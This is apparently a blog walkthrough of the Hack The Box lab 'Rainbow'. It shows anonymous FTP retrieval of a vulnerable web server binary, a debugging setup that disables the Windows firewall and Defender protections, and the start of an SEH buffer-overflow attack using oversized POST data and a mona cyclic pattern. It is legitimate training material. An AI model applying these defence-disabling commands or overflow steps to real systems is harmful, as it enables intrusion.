---
title: Rainbow
date: 2026-04-06
ShowToc: true
draft: false
TocOpen: true
tags:
  - blog
  - HTB
  - windows
  - Port21-FTP-anonymous
  - Port21-FTP-binary-file-transfer
  - reverse-engine-arm-linux-Ghidra-install
  - reverse-engine-HTB-remote-x64dbg
  - reverse-engine-windows-x64dbg-install
  - reverse-engine-windows-mona-install
  - reverse-engine-buffer-overflow
  - Windows-Privilege-UAC-Bypass
lastmod: 2026-05-07T02:57:59.469Z
---
# Box Info

{{< htb-info "https://www.hackthebox.com/machines/Rainbow" >}}

***

# Recon

### PORT & IP SCAN

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 10.129.234.171 -oN serviceScan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-01 18:51 +0800
Nmap scan report for 10.129.234.171
Host is up (0.47s latency).

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-05-01T10:52:57+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=rainbow
| Not valid before: 2026-04-30T10:01:14
|_Not valid after:  2026-10-30T10:01:14
8080/tcp  open  http-proxy
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Cache-Control: no-cache, private
|     Content-Type: text/html
|     X-Powered-By: Rainbow 0.1
|     Content-Length: 1478
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <meta charset="utf-8" />
|     <title>Dev Wiki powered by Rainbow Webserver</title>
|     <style> 
|     .rainbow {
|     font-size: 24pt;
|     background-image: linear-gradient(to left, violet, indigo, blue, green, yellow, orange, red); -webkit-background-clip: text;
|     color: transparent;
|     body {
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     text-align: center;
|     min-height: 100vh;
|     </style>
|     </head>
|     <body>
|     <!-- 
|     Under Development, please come back later -->
|     <pre class="rainbow">
|     _.--'_......----........
|     _,i,,-'' __,,...........___
|_    ,;-' _.--'' ___,,...
49668/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.98%I=7%D=5/1%Time=69F485A6%P=aarch64-unknown-linux-gnu
SF:%r(GetRequest,646,"HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x20no-cache
SF:,\x20private\r\nContent-Type:\x20text/html\r\nX-Powered-By:\x20Rainbow\
SF:x200\.1\r\nContent-Length:\x201478\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html
SF:>\n\n<html\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\
SF:n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n\x20\x20\x20
SF:\x20<title>Dev\x20Wiki\x20powered\x20by\x20Rainbow\x20Webserver</title>
SF:\n\x20\x20\x20\x20<style>\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20
SF:\x20\.rainbow\x20{\n\t\tfont-size:\x2024pt;\n\t\tbackground-image:\x20l
SF:inear-gradient\(to\x20left,\x20violet,\x20indigo,\x20blue,\x20green,\x2
SF:0yellow,\x20orange,\x20red\);\x20\x20\x20-webkit-background-clip:\x20te
SF:xt;\n\x20\t\tcolor:\x20transparent;\n\t}\n\tbody\x20{\n\x20\x20\t\tdisp
SF:lay:\x20flex;\n\x20\x20\t\tjustify-content:\x20center;\n\x20\t\t\x20ali
SF:gn-items:\x20center;\n\x20\x20\t\ttext-align:\x20center;\n\x20\x20\t\tm
SF:in-height:\x20100vh;\n\t}\n\x20\x20\x20\x20</style>\n</head>\n<body>\n\
SF:x20\x20\x20\x20<!--\x20\xf0\x9f\x8c\x88\x20Under\x20Development,\x20ple
SF:ase\x20come\x20back\x20later\x20-->\n\n\n\x20\x20\x20\x20\x20<pre\x20cl
SF:ass=\"rainbow\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\.--'_\.\.\.\.\
SF:.\.----\.\.\.\.\.\.\.\.\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_,i,,-''\x20__,,\.\.\
SF:.\.\.\.\.\.\.\.\.___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20,;-'\x20_\.--''\x20\x20\x20\x20_
SF:__,,\.\.\.")%r(HTTPOptions,646,"HTTP/1\.1\x20200\x20OK\r\nCache-Control
SF::\x20no-cache,\x20private\r\nContent-Type:\x20text/html\r\nX-Powered-By
SF::\x20Rainbow\x200\.1\r\nContent-Length:\x201478\r\n\r\n\xef\xbb\xbf<!DO
SF:CTYPE\x20html>\n\n<html\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\"\x20/>\
SF:n\x20\x20\x20\x20<title>Dev\x20Wiki\x20powered\x20by\x20Rainbow\x20Webs
SF:erver</title>\n\x20\x20\x20\x20<style>\x20\x20\x20\x20\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\.rainbow\x20{\n\t\tfont-size:\x2024pt;\n\t\tbackgroun
SF:d-image:\x20linear-gradient\(to\x20left,\x20violet,\x20indigo,\x20blue,
SF:\x20green,\x20yellow,\x20orange,\x20red\);\x20\x20\x20-webkit-backgroun
SF:d-clip:\x20text;\n\x20\t\tcolor:\x20transparent;\n\t}\n\tbody\x20{\n\x2
SF:0\x20\t\tdisplay:\x20flex;\n\x20\x20\t\tjustify-content:\x20center;\n\x
SF:20\t\t\x20align-items:\x20center;\n\x20\x20\t\ttext-align:\x20center;\n
SF:\x20\x20\t\tmin-height:\x20100vh;\n\t}\n\x20\x20\x20\x20</style>\n</hea
SF:d>\n<body>\n\x20\x20\x20\x20<!--\x20\xf0\x9f\x8c\x88\x20Under\x20Develo
SF:pment,\x20please\x20come\x20back\x20later\x20-->\n\n\n\x20\x20\x20\x20\
SF:x20<pre\x20class=\"rainbow\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\.
SF:--'_\.\.\.\.\.\.----\.\.\.\.\.\.\.\.\n\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_,i,,-''
SF:\x20__,,\.\.\.\.\.\.\.\.\.\.\.___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20,;-'\x20_\.--''\x20
SF:\x20\x20\x20___,,\.\.\.");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 119.88 seconds
                                                                  
```

### Port 445 smb

unable to get much information from smb

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  nxc smb 10.129.234.171  -u 'guest' -p '' --shares     
SMB         10.129.234.171  445    RAINBOW          [*] Windows 10 / Server 2019 Build 17763 x64 (name:RAINBOW) (domain:rainbow) (signing:False) (SMBv1:None)
SMB         10.129.234.171  445    RAINBOW          [-] rainbow\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                                             
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  nxc smb 10.129.234.171  -u 'guest' -p '' --users      
SMB         10.129.234.171  445    RAINBOW          [*] Windows 10 / Server 2019 Build 17763 x64 (name:RAINBOW) (domain:rainbow) (signing:False) (SMBv1:None)
SMB         10.129.234.171  445    RAINBOW          [-] Connection Error: [Errno 104] Connection reset by peer
                                                                                                                             
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$  nxc smb 10.129.234.171  -u 'guest' -p '' --rid-brute
SMB         10.129.234.171  445    RAINBOW          [*] Windows 10 / Server 2019 Build 17763 x64 (name:RAINBOW) (domain:rainbow) (signing:False) (SMBv1:None)
SMB         10.129.234.171  445    RAINBOW          [-] rainbow\guest: STATUS_ACCOUNT_DISABLED 
                                                                                                  
```

### Port 21  FTP

{{< toggle "Tag 🏷️" >}}

{{< tag "Port21-FTP-anonymous" >}} I’m able to connect to FTP using the anonymous account with no password

{{< /toggle >}}

```
anonymous : anonymous
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ftp 10.129.234.171
Connected to 10.129.234.171.
220 Microsoft FTP Service
Name (10.129.234.171:parallels): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 

```

### Port 80 Web

```
ftp> ls
229 Entering Extended Passive Mode (|||50100|)
125 Data connection already open; Transfer starting.
01-18-22  08:22AM                  258 dev.txt
01-18-22  08:30AM                54784 rainbow.exe
01-16-22  01:34PM                  479 restart.ps1
01-16-22  12:14PM       <DIR>          wwwroot
226 Transfer complete.

```

{{< toggle "Tag 🏷️" >}}

{{< tag "Port21-FTP-binary-file-transfer" >}} It’s important to put FTP into `binary` mode before transferring, or the binary file can be messed up.

{{< /toggle >}}

```
ftp> binary
200 Type set to I.
ftp> prompt off
Interactive mode off.
ftp> mget *
local: dev.txt remote: dev.txt
229 Entering Extended Passive Mode (|||50103|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************|   258        0.47 KiB/s    00:00 ETA
226 Transfer complete.
258 bytes received in 00:00 (0.34 KiB/s)
local: rainbow.exe remote: rainbow.exe
229 Entering Extended Passive Mode (|||50104|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************| 54784       36.45 KiB/s    00:00 ETA
226 Transfer complete.
54784 bytes received in 00:01 (32.79 KiB/s)
local: restart.ps1 remote: restart.ps1
229 Entering Extended Passive Mode (|||50105|)
125 Data connection already open; Transfer starting.
100% |********************************************************************************|   479        2.31 KiB/s    00:00 ETA
226 Transfer complete.
479 bytes received in 00:00 (1.14 KiB/s)
ftp> 
```

`dev.txt`

{{< code >}}

* Our webserver has been crashing a lot lately. Instead of touching the code we added a restart script!
* The server will dynamically pick a port when its default port is unresponsive (8080-8090).
* We'll fix this later by adding load balancer.

- dev team\
  {{< /code >}}

`restart.ps1`

{{< code >}}\
Set-Location -Path c:\rainbow\
for(;;){\
try{\
If (!(Get-Process -Name rainbow -ErrorAction SilentlyContinue))\
{Invoke-Expression "C:\rainbow\rainbow.exe" }\
$proc = Get-Process -Name rainbow | Sort-Object -Property ProcessName -Unique -ErrorAction SilentlyContinue
If (!$proc -or ($proc.Responding -eq $false) –or ($proc.WorkingSet -GT 200000*1024)) {
$proc.Kill()\
Start-Sleep -s 10\
Invoke-Expression "C:\rainbow\rainbow.exe"}\
}\
catch    {    }\
Start-sleep -s 30\
}\
{{< /code >}}

it is rarely to see the `.exe` , so the box is probable to do the buffer over flow

`rainbow.exe`

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ file rainbow.exe 
rainbow.exe: PE32 executable for MS Windows 6.00 (console), Intel i386, 4 sections

```

### Mac Ghidra install kali m2

{{< toggle "Tag 🏷️" >}}

{{< tag "reverse-engine-arm-linux-Ghidra-install" >}} Install the Ghidra on my macbook m2 kali to understanding the basic flow, and `ws2_32.dll` (Windows Socket 2.0 32-bit DLL) is a critical Windows system file that enables applications to communicate over networks. It acts as an interface between applications and network protocols, handling actions like connecting, sending, and receiving data (e.g., `socket`, `connect`, `send`, `recv`).

{{< /toggle >}}

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ sudo apt install ghidra -y
[sudo] password for parallels: 
The following packages were automatically installed and are no longer required:
  amass-common
  curlftpfs

```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ ghidra
Picked up _JAVA_OPTIONS:  -Dghidra.file.formats.zip.ZipFileSystemFactory.USE_BUILTIN_ZIP_SUPPORT=true
Picked up _JAVA_OPTIONS:  -Dghidra.file.formats.zip.ZipFileSystemFactory.USE_BUILTIN_ZIP_SUPPORT=true
 
```

![Pasted image 20260501202431.png](/ob/Pasted%20image%2020260501202431.png)

`ws2_32.dll` (Windows Socket 2.0 32-bit DLL) is a critical Windows system file that enables applications to communicate over networks. It acts as an interface between applications and network protocols, handling actions like connecting, sending, and receiving data (e.g., `socket`, `connect`, `send`, `recv`).

### HTB remote x64dbg

{{< toggle "Tag 🏷️" >}}

{{< tag "reverse-engine-HTB-remote-x64dbg" >}} Sometime I will unable to connect the local x86 machine, so I will use the HTB remote machine to have the x64dbg

{{< /toggle >}}

browser to https://academy.hackthebox.com/app/module/89/section/932

![Pasted image 20260501211128.png](/ob/Pasted%20image%2020260501211128.png)

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ mkdir share         
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ mv rainbow.exe share                                  
```

```
┌──(parallels㉿kali-linux-2025-2)-[~/Desktop]
└─$ xfreerdp /v:10.129.43.22 /u:htb-student /p:'Academy_student!' /drive:linux,/home/parallels/Desktop/share
e /dynamic-resolution

```

Still, a crash is typically an opportunity to get code execution if I can control the input that overflows the buffer (which I should be able to). I’ll open a Windows VM and run `rainbow.exe` in [x32dbg](https://x64dbg.com/). I’ll disable the starting breakpoints (Options –> Preferences –> Events and uncheck everything). On running, a window pops up:\
![Pasted image 20260501213324.png](/ob/Pasted%20image%2020260501213324.png)

![Pasted image 20260501213423.png](/ob/Pasted%20image%2020260501213423.png)

![Pasted image 20260501213549.png](/ob/Pasted%20image%2020260501213549.png)

It hangs, and back in x32dbg in the SEH tab: , will not have any repsonse

![Pasted image 20260501214002.png](/ob/Pasted%20image%2020260501214002.png)

![Pasted image 20260501214816.png](/ob/Pasted%20image%2020260501214816.png)

make the windows to open the 8080 port to outside

let change to windows machine to do it

### x64 windows vm setting

{{< toggle "Tag 🏷️" >}}

{{< tag "reverse-engine-windows-x64dbg-install" >}} install the x64dbg in the window local host , and set up the server for file data transfer, also close the windows firewall

{{< /toggle >}}

1. run the admin cmd --> netsh advfirewall set allprofiles state off
2. admin cmd powershell --> Set-NetFirewallProfile -All -Enabled False; Set-MpPreference -DisableRealtimeMonitoring \$true
3. Set-MpPreference -MAPSReporting 0
4. Set-MpPreference -SubmitSamplesConsent 2
5. Set-MpPreference -DisableIOAVProtection \$true
6. curl http://10.1.110.139/rainbow.exe -UseBasicParsing -o rainbow.exe
7. use x32dug to open and run
8. in windows --> netstat -ano | findstr :8080

```
PS C:\Users\test> netstat -ano | findstr :8080
  TCP    0.0.0.0:8080           0.0.0.0:0              LISTENING       4664
PS C:\Users\test>
```

In normal , my kali is not allow to connect the VM windows due to firewall.

```
┌──(root㉿kali)-[~/Desktop]
└─# nmap -p8080   10.1.110.140
Starting Nmap 7.98 ( https://nmap.org ) at 2026-05-04 04:18 -0400
Nmap scan report for DESKTOP-ACG20IL (10.1.110.140)
Host is up (0.00072s latency).

PORT     STATE SERVICE
8080/tcp open  http-proxy
MAC Address: 00:0C:29:5C:45:A2 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.33 seconds

```

```
┌──(root㉿kali)-[~/Desktop]
└─# └─# curl http://10.1.110.140:8080
└─#: command not found

```

```
bigbig=$(python -c 'print("A"*1000)')
```

```
┌──(root㉿kali)-[~/Desktop]
└─# bigbig=$(python -c 'print("A"*1000)')
                                                                                                                                                                                                                                            
┌──(root㉿kali)-[~/Desktop]
└─# curl http://10.1.110.140:8080 -d $bigbig     
```

![Pasted image 20260504162148.png](/ob/Pasted%20image%2020260504162148.png)

![Pasted image 20260504162207.png](/ob/Pasted%20image%2020260504162207.png)

![Pasted image 20260504162241.png](/ob/Pasted%20image%2020260504162241.png)

{{< toggle "Tag 🏷️" >}}

{{< tag "reverse-engine-windows-mona-install" >}} Install and setup the mona.py , the mona is a reverse-engine tools

{{< /toggle >}}

will use the https://github.com/corelan/mona3 , https://github.com/corelan/mona3

```
PS C:\Users\test\Downloads> Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
PS C:\Users\test\Downloads> powershell ./CorelanWin11VMInstall.ps1
[+] Testing if we have admin privileges
**********************************************
!! This script is not running as Administrator !!
!! Some install/registration steps may fail.  !!
!! Continuing anyway.                         !!
**********************************************
==============================================
 Corelan Training VM Install
 www.corelan-training.com
==============================================

*** -->> Make sure you have an active internet connection before proceeding! <<-- ***
Ready to continue? (Y/N): Y
[+] Checking internet connectivity
    OK   https://www.python.org/
    OK   https://pypi.org/
    OK   https://files.pythonhosted.org/
    OK   https://github.com/
    OK   https://aka.ms/
[+] Creating temp folder c:\corelantemp
[+] Removing existing PyKD files (best effort)
[+] Creating shortcut to cmd.exe on desktop (set to 'Run As Administrator').
[+] Downloading packages to temp folder
    1. Python 2.7.18
    2. Python 3.9.13 (32-bit)
    3. Python 3.9.13 (64-bit)
    4. Classic WinDBG
    5. PyKD extension package (x86)
    6. PyKD extension package (x64)
    7. mona.py
    8. windbglib.py
    9. Visual Studio 2017 Desktop Express
    10. VC++ Redistributable (x86)
    11. VC++ 2010 SP1 Redistributable (x86)
[+] Creating System Environment variable _NT_SYMBOL_PATH
*** Step failed: Set _NT_SYMBOL_PATH
*** Exception calling "SetEnvironmentVariable" with "3" argument(s): "Requested registry access is not allowed."
*** Continuing
[+] Adding c:\Python27 to PATH
*** Step failed: Add c:\Python27 to PATH
*** Requested registry access is not allowed.
*** Continuing
[+] Installing software
    12. Python 2.7
       Updating pip in Python 2.7.18
       Installing PyKD via pip in Python 2.7.18
    13. Python 3.9.13 (32-bit and 64-bit)
       Installing Python 3.9.13 32-bit
PS C:\Users\test\Downloads> ^C
PS C:\Users\test\Downloads> ^C
PS C:\Users\test\Downloads> powershell ./CorelanWin11VMInstall.ps1
[+] Testing if we have admin privileges
**********************************************
!! This script is not running as Administrator !!
!! Some install/registration steps may fail.  !!
!! Continuing anyway.                         !!
**********************************************
==============================================
 Corelan Training VM Install
 www.corelan-training.com
==============================================

*** -->> Make sure you have an active internet connection before proceeding! <<-- ***
Ready to continue? (Y/N): Y
[+] Checking internet connectivity
    OK   https://www.python.org/
    OK   https://pypi.org/
    OK   https://files.pythonhosted.org/
    OK   https://github.com/
    OK   https://aka.ms/
[+] Creating temp folder c:\corelantemp
[+] Removing existing PyKD files (best effort)
[+] Creating shortcut to cmd.exe on desktop (set to 'Run As Administrator').
[+] Downloading packages to temp folder
    1. Python 2.7.18
    2. Python 3.9.13 (32-bit)
Remove-Item : Cannot remove item C:\corelantemp\python-3.9.13.exe: Access to the path
'C:\corelantemp\python-3.9.13.exe' is denied.
At C:\Users\test\Downloads\CorelanWin11VMInstall.ps1:222 char:9
+         Remove-Item $OutFile -Force
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\corelantemp\python-3.9.13.exe:FileInfo) [Remove-Item], Unauthorize
   dAccessException
    + FullyQualifiedErrorId : RemoveFileSystemItemUnAuthorizedAccess,Microsoft.PowerShell.Commands.RemoveItemCommand
    3. Python 3.9.13 (64-bit)
    4. Classic WinDBG
    5. PyKD extension package (x86)
    6. PyKD extension package (x64)
    7. mona.py
    8. windbglib.py
    9. Visual Studio 2017 Desktop Express
    10. VC++ Redistributable (x86)
    11. VC++ 2010 SP1 Redistributable (x86)
[+] Creating System Environment variable _NT_SYMBOL_PATH
*** Step failed: Set _NT_SYMBOL_PATH
*** Exception calling "SetEnvironmentVariable" with "3" argument(s): "Requested registry access is not allowed."
*** Continuing
[+] Adding c:\Python27 to PATH
*** Step failed: Add c:\Python27 to PATH
*** Requested registry access is not allowed.
*** Continuing
[+] Installing software
    12. Python 2.7
       Updating pip in Python 2.7.18
       Installing PyKD via pip in Python 2.7.18
    13. Python 3.9.13 (32-bit and 64-bit)

 BITS Transfer
    This is a file transfer that uses the Background Intelligent Transfer Service (BITS).
       Installing Python 3.9.13 32-bit
       Installing Python 3.9.13 64-bit
       Updating pip in Python 3.9 (x86/x64)
       Python 3.9 32-bit not found, skipping pip upgrade
       Updating pip for Python 3.9 64-bit
       Installing PyKD via pip in Python 3.9 (x86/x64)
       Python 3.9 32-bit not found, skipping PyKD install (x86)
       Installing PyKD for Python 3.9 64-bit
       Registering msdia100.dll 64-bit (continue if missing)
    File not found, continuing: C:\Program Files\Common Files\Microsoft Shared\VC\msdia100.dll
       Registering msdia120.dll (continue if missing)
    File not found, continuing: C:\Program Files (x86)\Windows Kits\10\App Certification Kit\msdia120.dll
       Installing keystone-engine via pip in Python 2.7
       Installing keystone-engine for Python 2.7
    14. VC++ Redistributable (x86)
    15. Copying msdia140.dll to C:\Program Files (x86)\Common Files\Microsoft Shared\VC
       Failed to copy/register msdia140.dll, continuing
    16. Registering msdia100.dll (continue if missing)
    regsvr32 failed for C:\Program Files (x86)\Common Files\Microsoft Shared\VC\msdia100.dll (exit code 5), continuing
    17. Registering msdia120.dll (continue if missing)
    File not found, continuing: C:\Program Files (x86)\Windows Kits\10\App Certification Kit\msdia120.dll
    18. WinDBG
       Hold on, this may take a while...
    19. WinDBGX
Found an existing package already installed. Trying to upgrade the installed package...
No available upgrade found.
No newer package versions are available from the configured sources.
    9. PyKD, windbglib and mona
       a. Installing mona.py and windbglib.py in C:\Tools\mona3
       b. Installing pykd.dll in WinDBG engine/extensions x86 folder
       c. Installing pykd.dll in WinDBG engine/extensions x64 folder
    10. Visual Studio Code
       Visual Studio Code already present, skipping
    11. 7Zip
       7Zip already present, skipping
    12. Visual Studio 2017 Desktop Express - manual install
[+] Launching WinDBG to check if everything is ok
    ==> Please check the WinDBG log window and confirm that:
        - the !peb command didn't produce an error message
        - the !py -3.9 C:\Tools\mona3\mona.py command resulted in a list of available mona commands
[+] Removing temporary folder again

[+] All set

[+] Mona usage:

    In WinDBG(X) run:

      !load pykd
      as !mona !py -3.9 C:\Tools\mona3\mona.py

    Or run windbg.exe (windbgx.exe) with argument -c "!load pykd; as !mona !py -3.9 C:\Tools\mona3\mona.py"
    After that you can simply run '!mona' at the WinDBG(X) command line.

[+] Reboot your VM, and wait for updates to be installed if needed

```

### SEH Buffer overflow

{{< toggle "Tag 🏷️" >}}

{{< tag "reverse-engine-buffer-overflow" >}} Analyze the exe file to try the crash the programme(exe) to do the buffer over flow atttack,The vulnerability in rainbow.exe  is a standard Structured Exception Handler (SEH) buffer overflow triggered via the POST-Data field in an HTTP POST request. Because the required shellcode is large (351 bytes) and space might be limited after the SEH chain, the exploit relies on placing the shellcode at the *beginning* of the buffer and executing a chained backward jump to reach it.

{{< /toggle >}}

Open WinDBG (or WinDBGX).

![Pasted image 20260505155737.png](/ob/Pasted%20image%2020260505155737.png)

![Pasted image 20260505155804.png](/ob/Pasted%20image%2020260505155804.png)

Launch executable (advanced)

![Pasted image 20260505155816.png](/ob/Pasted%20image%2020260505155816.png)

Debug it !

![Pasted image 20260505155829.png](/ob/Pasted%20image%2020260505155829.png)

![Pasted image 20260505155855.png](/ob/Pasted%20image%2020260505155855.png)

* Run: !load pykd
* Run: !mona (or the alias !py -3.9 C:\Tools\mona3\mona.py if the alias didn't stick).

![Pasted image 20260505155942.png](/ob/Pasted%20image%2020260505155942.png)

Initially, a 900-byte cyclic pattern (generated via Mona) was sent to the server. The application crashed with an `Access violation - code c0000005`.

```
0:000> !load pykd
0:000> as !mona !py -3.9 C:\Tools\mona3\mona.py
0:000> !mona pattern_create 900
Hold on...

[ -- START -- ] Mona command started on 2026-05-05 01:03:11 (v3.0, rev 3013) 32bit 
[ -- START -- ] WinDBGX (32bit)
[ -- START -- ] Python: 3.9.13 (tags/v3.9.13:6de2ca5, May 17 2022, 16:24:45) [MSC v.1929 32 bit (Intel)])
[ -- START -- ] PyKD: 0.3.4.15 | Keystone-engine: 0.9.2 | OpenAI: not loaded | Anthropic: not loaded

[+] Command used: !mona pattern_create 900
    >>>> C:\Tools\mona3\mona.py pattern_create 900

Creating cyclic pattern of 900 bytes
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9

[+] Preparing output file 'pattern.txt'
    - (Re)setting output file c:\logs\rainbow\pattern.txt
Note: don't copy this pattern from the log window, it might be truncated !
It's better to open c:\logs\rainbow\pattern.txt and copy the pattern from the file

[ -- END -- ] 2026-05-05 01:03:11 | !mona took 0:00:00.109875

[+] All done.
```

Use the `g` to start the programe

```
0:000> g           
ModLoad: 73720000 73774000   C:\WINDOWS\SysWOW64\mswsock.dll
ModLoad: 74930000 74945000   C:\WINDOWS\SysWOW64\kernel.appcore.dll
ModLoad: 76060000 76127000   C:\WINDOWS\SysWOW64\msvcrt.dll
(2570.29f0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=fffffffc ebx=006148e0 ecx=39724138 edx=00000004 esi=004020c0 edi=006148e0
eip=00406156 esp=00c5f8c8 ebp=00c5f8d8 iopl=0         nv up ei ng nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010286
Rainbow+0x6156:
00406156 8b1401          mov     edx,dword ptr [ecx+eax] ds:002b:39724134=????????
```

```
PS C:\Users\test\Desktop> .\rainbow.exe
Starting Rainbow Server...!
[Debug] POST /
